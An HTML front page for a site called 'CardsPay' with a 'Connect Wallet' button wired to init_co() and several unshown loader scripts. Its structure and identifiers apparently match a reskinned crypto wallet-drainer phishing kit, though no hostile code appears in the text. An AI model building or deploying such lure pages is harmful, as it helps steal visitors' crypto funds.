<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CardsPay</title>

  <style>
    /* ===== FORCE WHITE SITE ===== */
    html, body {
      margin: 0;
      padding: 0;
      background: #ffffff !important;
      color: #000000 !important;
      font-family: Arial, Helvetica, sans-serif;
    }

    /* ===== HEADER ===== */
    .site-header {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      height: 68px;
      background: #ffffff;
      border-bottom: 1px solid #eaeaea;
      z-index: 1000;
    }

    .header-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 24px;
      height: 100%;
      display: flex;
      align-items: center;
      position: relative; /* חשוב למרכז התפריט */
    }

    /* ===== LOGO (LEFT) ===== */
    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 700;
      font-size: 20px;
      color: #1677ff;
    }

    .logo img {
      height: 32px;
      width: auto;
      display: block;
    }

    /* ===== NAV (TRUE CENTER) ===== */
    .nav-links {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 26px;
    }

    .nav-links a {
      text-decoration: none;
      color: #333;
      font-size: 15px;
    }

    .nav-links a:hover {
      color: #1677ff;
    }

    /* ===== WALLET BUTTON (RIGHT – ORIGINAL STRUCTURE) ===== */
    .advanced_mode {
      position: fixed;
      top: 14px;
      right: 24px;
      z-index: 1001;
    }

    .advanced_mode button {
      background: #4f7cff;
      color: #ffffff;
      border: none;
      padding: 10px 18px;
      border-radius: 999px;
      font-size: 14px;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .advanced_mode button:hover {
      background: #3b68f0;
    }

    /* ===== PAGE SPACER ===== */
    .page-spacer {
      height: 80px;
    }

    /* ===== CRITICAL FIX: WALLET MODAL ABOVE HEADER ===== */
    .w-modal,
    .modal,
    .wallet-modal,
    .walletconnect-modal,
    .overlay,
    .backdrop {
      position: fixed !important;
      z-index: 9999999 !important;
    }
  </style>
</head>

<body>

  <!-- HEADER -->
  <header class="site-header">
    <div class="header-container">

      <!-- LOGO -->
      <div class="logo">
        <img src="./assets/logo.jpg" alt="CardsPay" onerror="this.style.display='none'">
      </div>

      <!-- CENTER MENU -->
      <nav class="nav-links">
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Cards</a>
        <a href="#">Home</a>
      </nav>

    </div>
  </header>

  <div class="page-spacer"></div>

  <hr>

  <!-- WALLET BUTTON (UNCHANGED LOGIC) -->
  <div class="advanced_mode">
    <button onclick="init_co()">Connect Wallet</button>
  </div>

  <!-- REQUIRED BY SCRIPT -->
  <div id="injected-status" style="display:none"></div>

  <!-- SCRIPTS – SAME ORDER AS WORKING VERSION -->
  <script src="./assets/w-modal.js"></script>
  <script src="./assets/w-loader.js"></script>
  <script src="./assets/modules.js"></script>
  <script src="./assets/main.js"></script>

  <script>
    setInterval(() => {
      const el = document.getElementById('injected-status');
      if (el) {
        el.innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
      }
    }, 1000);
  </script>

</body>
</html>
